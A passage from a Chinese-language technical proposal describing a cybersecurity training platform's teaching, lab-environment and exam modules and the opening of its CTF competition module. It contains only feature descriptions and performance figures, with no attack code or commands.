实操模式可相互切换</p><ol><li>该模块支持设定教学实操环境的保留时长，并可以动态控制环境资源保留时间，为用户提供了更多的灵活性和控制权。</li><li>该模块支持学员在课后上传实验报告，教员可以对报告进行统一审核与评级，有助于提高教学质量和学员的学习效果。</li></ol><p>10） 该模块支持培训过程的教员和学员进行私聊和群聊，方便了教学过程中的沟通交流，有助于提高教学效果和增进师生关系。</p><p>11）该测评教学培训模块支持技能树功能，用户可以配置技能树对应学习的技能，并将技能树指定给学员进行学习。这种功能有助于学员系统地学习相关技能，提高学习效果。</p><p>12）该模块支持实验设置为“自学实验”和“教学实验”，以满足不同学习需求。学员可以根据自己的学习进度和兴趣选择适合的实验类型进行学习。</p><p>13）该模块支持学员根据系统提供的视频实验、课件实验、实操实验等内容进行自学，并提供配套的测试题。通过测试题，学员可以检验自己的学习成果，巩固所学知识。</p><p>14） 实操实验模块提供完整的虚拟环境，包括实验指导书和实操讲解视频。该模块采用模拟真实操作环境的虚拟化技术，提供接近真实的操作体验。</p><p>15） 系统支持根据岗位和专业方向配置技能树，提供个性化的自学路线。通过进度跟踪和数据分析功能，展示学员的技能学习进度，确保学员按照设定的路线进行学习。</p><p>16） 视频笔记功能允许学员在观看视频时保存播放位置的截图，并对截图进行文字说明。该功能采用图像捕捉和文本编辑技术，方便学员记录重要内容。</p><p>17） 视频笔记的统一查看功能支持对视频锚定的位置进行自动播放，提高学习效率。该功能利用视频索引和标记技术，确保快速准确地定位到相关内容。</p><p>18） 学员管理实操实验的虚拟环境模块支持手动和自动销毁实验环境。该模块采用资源管理和调度算法，确保资源的合理分配和及时回收。</p><p>19） 课程实验的星级评定功能允许学员对课程内容进行评价，增加了互动性和参与感。该功能采用评分算法和用户反馈机制，收集和分析学员的评价数据。</p><p>20） 考试题库管理功能支持多种题型，包括客观题和实操题。客观题包括单选、多选、判断、填空。题库管理模块采用数据库管理系统，确保题目内容的安全存储和高效检索。</p><p>21） 试卷中的实操题目支持环境访问和多Flag设置，提供真实的操作场景。该功能结合虚拟化技术和安全测试环境，为学员提供接近真实的考试体验。</p><p>22） 实操题目的试卷允许学员在考试时访问实操环境或下载附件进行解题。试卷生成模块采用动态内容生成技术，确保试卷内容的多样性和实用性。</p><p>23） 试卷管理功能支持基于题库快速生成试卷，也允许自定义试卷内容。试卷编辑模块集成了智能推荐算法，根据题库内容推荐合适的试题，并设置分数。</p><p>24） 教员设计试题的功能支持单选、多选、判断、填空等题型的编辑。试题编辑模块采用图形化界面，简化了试题的创建和管理过程。试题库的分类功能基于标签和关键字技术，方便教员按门类和难度进行划分。</p><p>25） 基于题库的试卷管理功能允许快速生成试卷，同时支持试题的自定义设置。试卷生成模块采用算法优化技术，确保试卷内容的合理分布和评分的准确性。</p><p>26） 集中考试功能支持教员设定考试计划，并自动开始考试。考试管理模块采用时间控制和资源调度技术，确保考试的顺利进行。</p><p>27） 系统提供相同试卷内容，但学员答题顺序不同的考试模式。此外，支持同一考试中题目分类相同但实际题目不同的考试。这一功能利用算法随机化技术，增加了考试的公平性和难度。</p><p>28） 实操环境的试卷允许学员在考试时访问实操环境解题。该功能结合了虚拟化技术和实时监控系统，提供稳定可靠的考试环境。</p><p>29） 考试自动阅卷功能支持查看学员的答题详情，并允许教员统一发布成绩。自动阅卷模块采用智能评分算法，确保评分的准确性和一致性。学员可在成绩发布后查看考试得分细节，试卷中的正确答案及解析。</p><p>30） 考试报告自动生成功能包括学员平均成绩、题型分析、方向分析、难易程度分析、学员答题趋势等内容。考试报告模块采用数据分析和可视化技术，提供全面的考试分析。</p><p>31） 学员自测功能支持基于试卷库的试卷进行自测，结果自动验证评分。自测模块集成了智能评分和反馈机制，提供题目解析，增加学习效率。</p><p>32） 教师对考试详情进行点评的功能，将点评内容体现在考试报告中。点评模块结合文本分析技术，提供详细的考试反馈和建议。</p><p>33） 学员可选择参与的多个考试生成综合报告。报告生成模块采用数据汇总和分析技术，从多个维度统计学员的考试表现，包括考试试卷构成以及学员针对试卷的答题情况的统计分析。</p><p>34） 实操实验全内容的设计与管理功能支持实操实验环境、靶标机、指导书、课件、视频、试题等内容。该模块采用综合管理系统，确保实操实验内容的完整性和多样性。</p><p>35） 指导书的在线编辑功能支持图片导入和样式编排。编辑模块采用图形化界面和富文本编辑器，支持指导书中添加试题等内容的配置，简化了指导书的创建和管理过程。</p><h4 id="性能实施方案-14"><a href="#性能实施方案-14" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统支持基于实验模板、基础模板、实验、镜像等四种方式自定义实操实验。系统采用模板化设计和虚拟化技术，提高实验环境的定制性和部署效率。</p><p>2） 实验指导书的导入功能支持doc、pdf、md等多种文档格式。导入模块采用文件解析和格式转换技术，确保文档内容的准确显示和高效处理。</p><p>3） 培训课件支持不少于三种类型，包括doc、pdf、ppt等。课件模块结合在线预览技术，提供流畅的文档浏览体验。</p><p>4） 系统支持不少于200人的培训并发用户数。并发处理模块采用高性能服务器和负载均衡技术，确保系统在高并发情况下的稳定运行。</p><p>5）提供内置网络安全培训课件（包含实操、视频和文档类）不少于 1000个，培训课件将涵盖各个方面的主题，包括但不限于网络攻击与防御、密码学、网络安全策略、漏洞利用、渗透测试、恶意软件分析等。其中内置不少于700个，这些课件可以随时在线访问和使用，并提供更新服务。</p><p>6）提供内置知识理论考核题目不少于10000道，涵盖网络安全领域的各个方面，包括但不限于网络攻击与防御、密码学、安全架构、漏洞分析、风险评估等。其中内置不少于5000道，这些题目将成为学员进行自测和模拟考试的重要资源，同时提供更新服务。</p><h4 id="技术实现内容-14"><a href="#技术实现内容-14" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统支持实验自定义及课程的标签分类，允许按章节编排实验。实现集中授课培训模式，包括教员讲课、学员实操和讲课与实操混合三种教学方式。系统具备学员管理功能，教员可以组建教学组，排定教学计划。实验环境可按计划自动部署，教员也可手动批量部署和管理实操环境。教员讲课模式中，教员可分享操作屏幕给学员观摩。实操模式下，教员能实时查看学员登录实验环境和操作过程。混合模式支持讲课模式与实操模式的动态切换，学员可观摩教员教学虚拟机界面和登录自己的环境进行操作。</p><p>系统支持设置教学实操环境的保留时长，动态控制环境资源保留时间。学员可上传课后实验报告，教员负责统一审核与评级。培训过程中支持教员和学员的私聊和群聊。技能树功能允许教员配置技能树，指定给学员进行学习。实验可设为“自学实验”和“教学实验”。学员可根据提供的视频实验、课件实验、实操实验等内容进行自学，配套测试题。实操实验提供虚拟环境、指导书和讲解视频等内容。根据岗位、专业方向配置技能树，提供自学路线，显示学习进度。支持学员按技能树设定路线进行学习。</p><p>视频笔记功能允许学员保存视频播放位置的截图，并添加文字说明。视频笔记支持统一查看，自动播放锚定位置。学员可管理实操实验的虚拟环境，包括手动销毁与自动销毁实验环境，推迟销毁环境。支持学员对课程实验进行星级评定。提供考试题库管理，包括客观题和实操题，客观题类型包括单选、多选、判断、填空。试卷中题目支持实操题和多个Flag的题目。有实操题目的试卷，学员可访问实操环境或下载附件进行解题。提供试卷管理功能，基于题库快速生成试卷，自定义生成试卷并设置分数。教员可设计试题，进行题目编辑、答案编辑，将试题库按门类、难度划分。支持教员进行集中考试，设定考试计划，自动开始。提供不同试卷内容的考试，支持同一考试题目分类相同但实际题目不同的考试。有实操环境的试卷，学员可解题。考试提供自动阅卷功能，支持查看答题详情，教员统一发布成绩，学员可查看考试得分细节和试题正确答案及解析。考试报告自动生成，包含学员平均成绩、题型、方向、难易程度、答题趋势等内容。支持学员根据试卷库自测，结果自动验证评分，提供题目解析。教师可针对考试详情进行点评，点评内容体现在考试报告中。学员可选择参与的考试生成整体报告，报告统计考试试卷构成和答题情况。支持实操实验全内容的设计与管理，包括实操环境、靶标机、指导书、课件、视频、试题等内容。指导书支持在线编辑，图片在线导入和拷贝、样式编排，添加试题等内容配置。</p><p>性能参数为，系统支持基于实验模板、基础模板、实验、镜像等4种方式自定义实操实验。支持实验指导书文档的导入，格式包括doc、pdf、md等。支持3种培训课件类型，包括doc、pdf、ppt等，支持课件内容在线预览。培训并发用户数支持达到200人。网络安全培训课件总量为1000个，内置700个。知识理论考核题目总量为10000道，内置5000道。</p><h5 id="方案设计-3"><a href="#方案设计-3" class="headerlink" title="方案设计"></a>方案设计</h5><p>1. 实验自定义与课程管理</p><p>支持实验以及课程的标签分类。</p><p>课程可按章节编排实验，提供实验模板管理。</p><p>支持课程和实验的自定义，包括实验环境、指导书、视频等。</p><p>2. 教学模式支持</p><p>支持集中授课培训模式：教员讲课、学员实操、讲课与实操混合三种方式。</p><p>教员讲课模式下，支持屏幕共享功能。</p><p>实操模式下，教员能实时查看学员操作。</p><p>混合模式下，支持讲课与实操的动态切换。</p><p>3. 学员与教学组管理</p><p>教员可创建、管理教学组。</p><p>支持教学计划的排定与管理。</p><p>实验环境可按计划自动部署或由教员手动批量管理。</p><p>4. 实操环境管理</p><p>支持实验环境的保留时长设置。</p><p>学员可上传实验报告，教员进行审核与评级。</p><p>支持学员对实操环境的手动销毁与自动销毁，以及销毁延期。</p><p>5. 交流与评价</p><p>支持教员与学员间的私聊和群聊。</p><p>学员可对课程实验进行星级评定。</p><p>6. 技能树与自学支持</p><p>支持技能树功能，教员可配置并指定给学员。</p><p>支持学员按技能树设定的路线自学。</p><p>提供自学实验内容，包括视频、课件、实操等。</p><p>7. 考试与测试管理</p><p>提供题库管理，包括客观题与实操题。</p><p>支持试卷的快速生成与自定义。</p><p>支持考试计划设定与集中考试。</p><p>提供试卷自动阅卷与成绩发布。</p><p>支持学员自测，自动验证评分与解析。</p><p>8. 教学内容与资源管理</p><p>支持实操实验全内容的设计与管理。</p><p>支持指导书的在线编辑与样式编排。</p><p>支持实验指导书、课件类型的导入与在线预览。</p><p>性能参数</p><p>支持自定义实操实验的多种方式（实验模板、基础模板等）。</p><p>支持实验指导书的多格式导入（doc、pdf、md等）。</p><p>支持培训课件类型的多样性（doc、pdf、ppt等），并支持在线预览。</p><p>平台支持200人的并发用户数。</p><p>网络安全培训课件总数达1000个，700个内置，三年内更新300个。</p><p>知识理论考核题目10000道，5000道内置，三年内更新500道。</p><p>本方案聚焦于提供一个全面的教学与实验管理平台，能满足多样化的教学需求，并提供高效、互动的学习环境。平台设计考虑了教学内容的多样性、学员管理的便捷性、实操环境的灵活性以及考试与评价的全面性。性能参数确保平台能够支持大规模的用户并发访问，以及丰富的教学资源和题库管理。</p><h5 id="方案简介-1"><a href="#方案简介-1" class="headerlink" title="方案简介"></a>方案简介</h5><p>培训模块主要提供网络安全实验的培训实操环境，全面支持自学、教师教学、实操教学和考试三种模式。用户可以登录到实验环境中进行操作，通过自学的方式进行训练。支持教员邀请和添加学员账号，成立班级，统一管理，发送通告。</p><p>系统以课程、实验以及考试的方式向用户提供培训服务，其中课程包含有多个实验，学员可以根据实验提供的视频、指导书等资源在实操环境下进行学习。考试则包含多个客观题目以及多个实操环境题目，学员在规定时间内进行答题。</p><p>教学培训主要有自主训练、训练教学两种实训的业务形式，自主训练方式是学员根据教学培训分系统提供大量的实训课程及实验，并结合自身的知识结构及兴趣爱好，选择系统中提供的内容进行自学，从而达到对自身网安技能进行强化或补漏的目的。自主训练模式下用户能够对自学实训的环境进行部署、销毁的管理，并实操环境也能根据系统设置的时间限制自动进行资源的释放。训练教学方式是教员按照教学要求利用教学培训分系统进行实验排课和考试，测试学员的各种基础能力、前期的学习成功等。</p><p>教学培训分系统还提供实训内容的设计功能，具备课程信息管理、实验指导书管理、实验环境管理、支撑按需定制内容的实操训练和考试等功能。</p><p>按照业务流程，教学培训分系统架构如下图所示，可以分为两个层面：业务层和支撑层。</p><p>业务层有三个主要功能，一是自学模块、二是教学模式、三是技能考试。自学练习提供了学员员自己按照自身需求进行学习的能力，融合了实验自学和视频自学，学员员可以按照特定关键词、特定网络安全分类进行实验的选择，启动特定实验、接入特定实验进行练习；排课授课提供了教官对参训人员的统一授课能力，设计师进行课程设计、规划排课日程、定制环境计划并且在授课期间进行模式切换；知识考试提供了试卷制定、考试排期、考分统计和生成报告的功能。</p><p>教学培训分系统由4个模块组成，自学模块、教学模式、技能考试模块和实验环境管理。自学模块主要面向有自主学习培训需求的学员提供自助式学习支撑，学员可以检索、查看、选择培训课程，选择后即可对需要实验环境的实验进行环境部署，在实验环境快速构建完毕之后开始在系统提供的实操环境中进行学习实操，无需培训教师的集中管理。</p><p>在学员员培训实践过程中，可以阅读实验指导书，观看实验视频，对有实操环境的实验，学员可以通过SSH、RDP、VNC等协议的Web方式访问虚拟机。通过Web接口，用户能够远程连接到虚拟机，执行复制粘贴操作，上传文件，以修复安全漏洞。培训实操环节中，无需培训老师干预，学员员可以自行创建实验环境，获得访问实验环境的访问入口。登录实验环境后能够在该用户权限内进行各种实验操作。实验完成之后，学员可以手动将实验环境进行销毁，并且实验环境可根据预设的预计实验时长自动销毁，防止资源长期占用。自主训练模块允许学员根据个人需求定制训练计划，从课程内容、安全领域到难度级别等多个方面挑选最适合自己的课程。</p><p>排课考试模块负责提供教员员对学员员的教学进行排课授课及课程设计与管理能力。学员员所在在的班级和学科各不相同，编排起来工作量大，且费时费力，排课时若没有严格和周密的计划，所排出课表极容易引起冲突，甚至于严重影响到正常教学活动的进行。这就需要有一个较为实用的排课系统使排课工作更加的高效化、人性化。本排课考试模块教师通过自动分配环境、自动开放实验、自动停止实验以及销毁环境，从而达到充分利用教学资源的目的。教学模式为授课人员提供便捷的课程管理的功能，授课人员可以进行课程的设计、课程的排期、课程环境的自动管理，以及授课过程中的模式切换等操作。</p><p>系统提供了一个多功能的培训支持平台，具体功能包括以下几个方面：</p><p>1）课程设计：设计人员有能力通过该系统来构建课程，他们可以将多个相关联的实验链接起来，以形成一个结构化的课程。这种设计增添了课程的系统性，使得学习过程呈现出自然的递进关系，有助于受训人员对知识的逐级掌握，深化对网络安全知识的理解。</p><p>2）课程排期：通过一个日历视图界面，授课人员能够灵活地安排课程。可以为特定的日期和时间段安排课堂，确保教学活动按预定计划进行。课程排定后，受训人员能够在系统中查看自己的上课时间表，从而方他们规划学习计划。</p><p>3）环境管理：一旦课程排定，系统将自动调度所需的环境资源。包括创建、接入和销毁实验环境的任务将被安排进入任务队列，并在预定时间自动触发执行。这保证了学习环境在需要时得到有效的分配和整备。</p><p>4）模式切换：在授课过程中，系统允许授课人员在讲授和实操模式之间自由切换。在讲授模式下，所有受训人员共同观看授课人员展示的屏幕，而在实操模式下，每位受训人员可进入自己的专属环境中进行操作。此外，授课人员能够实时监控每位受训人员的操作情况，这可以提高学习效率并及时给予反馈。</p><p>系统能提供一个完善的网络安全教育和训练平台，确保受训人员能够在结构化、互动化的环境中获得最佳的学习体验。</p><p>技能考试模块为授课人员提供了理论题考核的能力。授课人员可以首先定制试卷，之后进行考试排期，并在考试中实时查看进度，并最后查看考试的整体报告。</p><p>1）试卷制定：系统提供授课人员创建试卷的能力，可以制定试卷名称、难度、描述，并手动或者自动选择题目。题目包含单选、多选和判断三种类型。</p><p>2）考试计划：授课人员创建一个考试，填入名称、配置人员、配置时间、选择试卷后，考试即可等待进行。考试进行中，学员答题界面进行答题。</p><h6 id="自学模块"><a href="#自学模块" class="headerlink" title="自学模块"></a>自学模块</h6><p>靶场环境提供一个多功能的学习平台，能适应教学和自学需求。对于教师而言，它支持在线授课，使他们能够上传和分享视频讲解和课件。而学生则可以通过观看视频、阅读课件来自行学习，并可直接进入系统进行实际操作练习。该平台支持主流的视频和文本文件格式，确保与工商银行现有的课程资源兼容，便于整合现有教育内容，并为学习者提供一个无缝的学习体验。</p><h6 id="自学练习流程"><a href="#自学练习流程" class="headerlink" title="自学练习流程"></a>自学练习流程</h6><p>自学练习流程包含教员部分和学员部分。</p><p>在实验创建的过程可以设置试验方向、试验类型、试验难度、时长，选用合适的视频、工程模板和指导书。课程创建可设置课程方向、课时、选择实验，设置课程难度。</p><p>学员可在自学练习功能观摩视频、自学实验、自学试验，并且支持按照难度、类型、方向筛选，支持根据学习进度筛选课程。</p><p>自学模块由实验检索展示模块、实验进行模块、实验记录分析模块和实验统计模块组成。</p><h6 id="实验检索展示"><a href="#实验检索展示" class="headerlink" title="实验检索展示"></a>实验检索展示</h6><p>实验检索展示模块用于展示自主训练模块中所有的训练实验环境并提供多种搜索方式，便于学员浏览和查询自己所需的学习内容。学员员可以按照实验分类进行实验选择，也可通过关键词进行搜索，或者按照实验的方向进行体系化的学习。</p><p>学员能够基于系统提供的课件进行自主学习，提供实验按类型、关键字进行查找并订阅，能够自主分配实操环境。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5367b7bcf53b82b5c3b189df95a35274.png"></p><p>我的上课</p><h6 id="实验操作进行"><a href="#实验操作进行" class="headerlink" title="实验操作进行"></a>实验操作进行</h6><p>实验操作进行模块为学员提供实验实操和学习的核心支撑。主要包含了实验视频、实验指导书展示、虚拟环境创建、虚拟机接入、虚拟机销毁等功能。学员能够根据实验提供的视频进行学习，支持学员针对学习的实验随堂答题，并查看试题答案与解析。</p><p>1）学员能够对系统内自主学习的视频查看，支持用户按视频类型、难易程度，名称等进行视频的检索。</p><p>支持视频观看学习功能并可全屏播放观看视频，能够对选中的视频进行播放，并记录播放历史。对观看完的视频会标记为已学习。没完成的标记为学习中。用户也能对视频的喜好程度进行点赞。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c13c82bc2cd3037454e4c80d0dd3e421.png"></p><p>视频播放</p><h6 id="实验记录分析"><a href="#实验记录分析" class="headerlink" title="实验记录分析"></a>实验记录分析</h6><p>实验记录分析模块根据学员员的学习数据进行多维度的分析和挖掘，提供多种分析展示方式和生成学习评估报告，并能根据学员员的学习数据进行实验推荐、学习路径推荐、岗位规划推荐等，实验记录分析模块可按照多种分类生成学员员的各种学习曲线，以及其他表现形式，使得学员可以对自身的学习历程和能力有直观准确的认识。支持用户自主学习路径的查看，系统能够对学员的学习历史记录进行分析统计。</p><h6 id="教学模式"><a href="#教学模式" class="headerlink" title="教学模式"></a>教学模式</h6><p>排课授课流程</p><p>设置教学班支持设置实验组、上课时间、课节、排课/实操模式。上课过程可查看学生在线状态、环境部署状态、对操作环境进行管理和接入，讲课模式、控制实操模式与讲课模式切换，支持与学员私聊和群聊。课程结束可查看答题记录，查看视频学习统计，查看报告评级。</p><p>学员可根据难度、课程类型、课程方向进行课程筛选并进入课程学习。学员可观摩教师操作投屏，也可以自己进入环境操作。课程结束后可查看学习进度，查看已学习课程。</p><p>课程设计</p><p>课程设计提供大型课程实验设计的能力，课程实验可根据用户需要进行定制。为了让学员能够根据实验内容，独立完成实验。实验管理模块提供了实验的创建、删除、修改等功能。在创建实验时，关联训练环境的工程模板，并在这个工程模板下设定本次实验的具体内容。实验管理模块还支持非实操型实验的管理。同时，在创建实验时，创建实验的指导书，其包含了实验的概述、目的、环境和操作的详细步骤等信息，学员可以参照详细步骤完成本次训练，达到提升能力的效果。全面支持远程实验教学，支持教学和自学两种学习模式。</p><p>攻防靶场系统为教学课程提供了一个全面的设计平台，能够实现远程学习模式，使得教与学都不受地理位置的限制。</p><p>在课程设计方面，设计人员有能力将各类实验根据知识点的逻辑顺序组合成完整的课程。这种方法不仅使课程内容呈现出层次性和连贯性，而且有助于受训人员沿着由浅入深的路径学习，从而更加系统地掌握网络安全的关键知识和技能。</p><p>课程的设计除了理论知识以外，还支持拓扑绑定的操作实验，加强了实践操作的环节。通过选择具体的实验作为课程的一部分，教学内容变得更加丰富和直观。同时，管理系统允许教员给自己分配实操环境，并且支持屏幕共享功能，让学员能够同步观察教员的操作过程，加深理解和记忆。</p><p>此外，该系统还能够灵活切换教员讲课和学生实操的模式。在教员讲课模式下，学生可以通过观看教员的屏幕操作来学习具体步骤和方法。实操模式则允许学生进入自己的实验环境中，实际操作课程内容，而教师则能够通过投屏监控和指导学生的操作。</p><p>综上，该系统为网络安全教学提供了一个集理论教学、操作练习和实验演练为一体的综合平台，能提升网络安全教育的质量和效果。</p><p>排课授课</p><p>系统通过排课管理功能简化课程安排流程，确保学员能快速分配到实操环境，提高教学效率。支持教员定制自己的课程及实验，并分享给其他人使用。支持教员授课模式实验教学，教员建立自己的实操环境并将自己的屏幕分享给学员。</p><p>系统包含了一个全面的课程管理功能，其提供给教员一个便捷、高效的教学管理体验。</p><p>首先，系统允许教员对课程内容进行细致的管理，包括章节和课时的编辑与修改。这不仅提供了教程内容的结构化介绍，还加入了动态的编辑功能，以适应课程变化和实时更新的需求。</p><p>课时资源管理是系统的核心功能，教员能够上传必要的教学资源，对已上传的资源进行修改，以及预览和查看这些资源。这保证了课时资源可以随时更新和增强，从而维持教学内容的时效性和适宜性。</p><p>在排课管理方面，教员可以依据提供的日历功能进行自主排课，确保按照教学计划进行教学活动。此外，系统支持排课实验环境的自动部署，使得必要的教学资源能够及时就绪。为了避免资源浪费，排课环境资源默认被保留48小时，但系统也提供选项来配置保留时长，以适应特定的教学需求。</p><p>学员体验同样被系统所重视，教员可以通过实验组邀请学员加入，而学员则可以通过系统观看教师分享的屏幕进行学习，这强化了学员的互动和参与度。这一套综合性的管理功能，使得系统成为一个不仅强调教学内容丰富，也致力于提升教学效率和学习体验的教学管理平台。</p><p>在教学管理系统中，创建和管理教学班级是教师工作流程中的基础环节。通过这个功能，教师能高效地建立起班级的结构，并根据教学活动的要求设定和调整教学模式。系统为教师提供两种基本的教学模式，首先是讲课模式，这是以讲授理论知识为主，适用于理论学科或新概念的引入阶段。其次是实操模式，这一模式侧重于技能的实践操作和实验，帮助学员通过亲身实践来深化对理论的理解和应用。</p><p>系统中的班级成员管理功能为教师提供了灵活的班级组织手段，允许教师直接邀请或添加学员账号，建立起成员名单。这种管理使教师能够根据学员的具体情况，定制教学计划和排课内容，进而提高教学的针对性和有效性。</p><p>课程排期环节通过日历的形式展现，让授课人员能够直观地安排和规划课程时间表。教师可以选择一段特定的时间，在日历上安排一项特定的课程活动，包括理论讲授和实操练习。一旦排期完成，就会及时通知参与的学员，学生们可以访问系统查看自己的课程安排，做好相应的准备。</p><p>这种课程管理系统的优势在于保证了教学活动的系统性和条理性，同时也为参与者提供了适时和透明的信息流通，从而为教学和学习的顺利实施打下了坚实的基础。</p><p>1）教员添加我的教学班级，填写教学班级名称，选择教学分类，选择班级，选择多个课程、多个实验，如下图所示：</p><p>2）教员对教学班级进行管理，具体的操作有修改、删除教学班级和教学环境部署等操作，部署的操作分为单个的部署、销毁以及批量的部署和销毁。同时部署完成的教学环境也提供了进入教学环境的入口，如下图所示：</p><p>分别给班级按日历时间添加教学模式、排课计划。</p><p>提供排课时间系统通知功能，在课前5分钟能够发送系统内通知消息给用户。</p><p>模式切换</p><p>该系统提供了一个功能齐全的教学管理界面，允许教员为学员分配并管理个人化的实验环境。学员随后可以登录系统，并独立进入到自己被分配的实验环境中进行各种操作实践。这种设置可以保证学员在一个控制和隔离的环境中学习和实践，而不会影响到其他用户的实验环境。教员可以选择分享自己的屏幕给学员观看，或者让学员在自己的实验环境中进行实操学习。系统还提供了教学模式的切换，教员可以根据教学需求选择实操或讲课模式，并通过点击相应的讲课或实操按钮进行切换。这样，教员可以灵活地管理学员的实验环境，并根据需要进行不同的教学方式和指导。</p><h6 id="技能考试"><a href="#技能考试" class="headerlink" title="技能考试"></a>技能考试</h6><p>网络学习平台的在线考试功能为教师提供了多种便利:</p><p>教师可以根据题库快速生成试卷,也可以自定义组卷。并可以灵活设置每道题的分值。</p><p>教师可以按班级或学员个体安排考试计划,在考试开始前系统会自动发出通知。考试结束后,系统具备自动阅卷功能。学员可以查看每题得分情况和正确答案解析。</p><p>教师可以通过多维考试报告了解学生的考试表现,如正确率、成绩分布、平均作答时间等。在考试开始前5分钟,系统会自动发出考试通知,并在考试时间内开启,在结束时自动禁止答题。</p><p>学员可以在规定时间内登录系统在线进行考试答题。</p><p>通过提供全流程的在线考试功能,教职员工可以高效组织网络教学中的练习检测,学员也可以进行在线考试,整个考试管理和执行流程规范化。</p><p>考试流程</p><p>考试准备过程包含试题库创建，支持主观题和客观题。创建试卷可设置考试难度和选题。创建考试可选择课程班级的学员，选择考试题目，选择考试时间。学员会受到考试公告。</p><p>在考试系统中，学员会在考试开始前五分钟收到提醒。考试时间一到，系统允许学员进入并开始作答。完成后，系统自动评分客观题如单选和多选题，对主观题则生成待评分项，最终汇总出学员的成绩单。</p><p>考试结束后教员可查看成绩并发送，学员能看到成绩单和成绩排名。</p><p>试卷制定</p><p>系统提供了灵活的考试模式设置，满足不同类型考核的需求。考试模式的设置至少包括以下几种：</p><p>1. 理论考试模式：传统的考试形式，考察学员对知识点的理解和记忆。题型可以包括单选题、多选题和判断题，允许教师设置标准的文本问题，学员在线选择或标记答案。</p><p>2. 实验操作类考试模式：这种模式适用于实践技能和操作过程的考核。系统可能会提供一个虚拟的实验或模拟环境，学员需要在其中完成一系列的具体任务，如编程、配置网络或修复安全漏洞。</p><p>3. 混合类考试模式：结合了理论和实验操作的考试方式，学员既要回答关于概念性知识的问题，同时也要在实验环境中执行具体的操作。这种模式可以全面考察学员的综合能力，既包括知识掌握程度，也涉及实操技能。</p><p>系统支持多场考试同时进行，使得不同的班级或不同科目的测试可以互不干扰地同时举行。这大大提高了评估的灵活性和效率。每次考试都可以自定义题库，按照需要随机抽题或指定题目，确保考试的公平性和随机性。</p><p>该系统针对考试管理的综合性设计，使教师能够高效地组织和监督考试，学员能够方便地参与考核，为教育和培训提供了强有力的技术支持。</p><p>考试计划</p><p>考试计划制定支持结合课程体系设置考试方案。设计师可根据课程、学院班级设置考试。系统支持自测考试模式，学员可根据自身水平和学习领域设置自测。</p><p>分数统计</p><p>提供考试自动阅卷功能，教员在考试结束之后，能够查看学员的答题细节，并能够查看考试排名，发布成绩。学员在成绩发布之后，能查看考试得分细节，并能查看试卷中题目的正确答题及试题解析。</p><p>考试报告</p><p>考试提供对于考试的各种信息的展示，包括知识点掌握情况汇总、试卷构成汇总，教员可以查看报告并将报告导出。</p><h3 id="网络安全攻防与汽车测评竞赛模块"><a href="#网络安全攻防与汽车测评竞赛模块" class="headerlink" title="网络安全攻防与汽车测评竞赛模块"></a>网络安全攻防与汽车测评竞赛模块</h3><h4 id="功能实施方案-15"><a href="#功能实施方案-15" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 系统支持夺旗赛赛事的组织与管理，适应线上和线下两种模式。线上模式特别支持为外网访问生成随机地址，以确保访问安全和控制。这项功能使得远程参与者可以安全地加入比赛，同时保证比赛的可访问性和保密性。</p><p>2） 提供夺旗赛赛题环境的快速构建与管理功能。系统能够根据所选择的队伍和赛题一键生成比赛环境，极大简化了赛事准备过程。这一功能涉及高效的环境部署和配置工具，确保比赛环境的快速搭建和稳定运行。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c7444020595d79e00b2eea6f3b1dcad.png" alt="IMG_256"></p><p>一键生成比赛环境</p><p>3） 支持比赛一血积分激励机制，第一个正确回答的队伍将获得额外积分。系统允许灵活设置激励队伍的百分比和额外分数，以增加比赛的激烈程度和参与者的积极性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b2281b624a82b1f9d29f3b9651fca8fa.png" alt="IMG_256"></p><p>奖励机制</p><p>4） 支持预先设定比赛开始和结束的时间，并在指定的时间点自动开始或停止比赛。系统能够在比赛开始前禁止选手访问环境，可以防止选手提前获得比赛题目或其他相关信息，保证比赛的公平性。在比赛结束后，自动禁止选手继续答题，确保比赛的规则执行。</p><p>5） 提供比赛的手动提前开始和结束功能，以及比赛的暂停、恢复和延期选项。这些功能为比赛的灵活管理提供支持，允许赛事组织者根据实际情况调整比赛进程。</p><p>6） 支持分阶段开放赛题、定时开放赛题，以及发送赛题开放通知。这一功能通过自动化的时间控制和通知系统实现，确保比赛按计划顺利进行。</p><p>7） 提供非固定Flag赛题的作弊检测功能，并支持对违规作弊的队伍实施自动禁赛、手动禁赛以及恢复比赛的管理。这一功能通过高级的行为分析和监控技术实现，维护比赛的公正性。</p><p>8） 支持队伍在解题过程中遇到难题或卡壳时申请解题提示功能来获取一些线索或指导，并在得到提示后正确回答的情况下对队伍进行扣分处理。同时，系统支持解题提示的定时发放，使比赛保持悬念并鼓励选手深入思考。</p><p>9） 系统支持至少两种盲打方式：一种是选手不能查看比赛排行榜，对比赛结果保持不知情，以增加比赛的不确定性和刺激性；另一种是选手在提交Flag之后不得知自己的答题是否正确，避免通过穷举法找到正确答案，这种方式以选手最后一次提交的答案为准，增加了比赛的挑战性和策略性。</p><p>10） 系统通过权限控制实现对于选手信息的控制，选手不能够查看比赛排行榜，选手对比赛结果不知情，以防止选手在比赛过程中通过查看排行榜来获取他人的答题进度或答案，并以此来影响自己的策略和决策。</p><p>11） 系统支持在选手提交Flag之后不显示答题正确与否，而是在比赛结束后，由裁判或者系统进行答案的验证和评判，以防止选手使用穷举法找到正确答案。在这种模式下，系统将以选手最后一次提交的答案为准，进行核对并给出相应的分数或排名，增加比赛的挑战性和策略性。</p><p>12） 支持比赛一血赛题的消息公告，允许配置针对赛题的提交报告或针对比赛的提交报告。这一功能通过赛事信息系统实现，确保及时通知和记录比赛关键时刻，增加比赛的互动性和公平性。</p><p>13） 支持攻防赛赛事活动的定义，包括确定比赛形式、设定规则和参赛条件、制定赛程安排等。支持比赛队伍和选手管理，用于注册和管理参赛队伍以及参赛选手的信息。系统支持选手加入不同的队伍，参加不同场次的比赛，提供灵活的队伍管理和赛事组织能力。</p><p>14） 